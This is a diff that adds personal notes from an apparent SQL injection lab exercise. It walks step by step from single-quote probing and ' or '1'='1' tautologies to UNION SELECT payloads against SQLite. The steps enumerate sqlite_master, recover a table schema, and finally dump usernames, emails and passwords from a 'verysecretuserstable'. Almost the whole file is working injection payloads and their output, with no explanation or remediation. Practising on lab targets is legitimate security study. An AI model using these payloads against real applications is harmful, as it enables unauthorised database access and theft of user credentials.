@@ -1,0 +1,66 @@
+try to inject single quote(')
+[select location from samples where id='97''
+
+id=97'
+
+select location 
+from samples 
+where id='<>'
+=============
+select location 
+from samples 
+where id='<>'
+
+=========
+id=97' or '1'='1
+
+select location 
+from samples 
+where id='97' or '1'='1'
+===================
+
+input query = 1984'
+
+SELECT * FROM books WHERE title='1984''
+
+===
+SELECT * FROM 
+books 
+WHERE 
+title='1984''
+
+============
+1984' or '1'='1
+
+SELECT * FROM books WHERE title='1984' or '1'='1'
+=====
+users
+
+search query=1984' union all select null;
+
+=================================
+iwrestledabearonce' UniOn select 1,2,3,4,5,6,7,8,9,10--
+============
+iwrestledabearonce' UniOn select db_name(),2,3,4,5,6,7,8,9,10--
+
+==Working==
+iwrestledabearonce' UniOn select sqlite_version(),2,3,4,5,6,7,8,9,10--
+
+iwrestledabearonce' UniOn select name,2,3,4,5,6,7,8,9,10 from sqlite_master--
+
+music 		2 		3 		4 		5 		6 	
+verysecretuserstable 		2 		3 		4 		5 		6 	
+
+iwrestledabearonce' UniOn select 1,2,3,4,5,6,7,8,9,10 from verysecretuserstable--
+
+==Extract query used to create a table==
+iwrestledabearonce' UniOn select sql,2,3,4,5,6,7,8,9,10 from sqlite_master where type='table' and name='verysecretuserstable'--
+
+============
+iwrestledabearonce' UniOn select id,username,email,passwd,5,6,7,8,9,10 from verysecretuserstable--
+
+
+
+
+
+
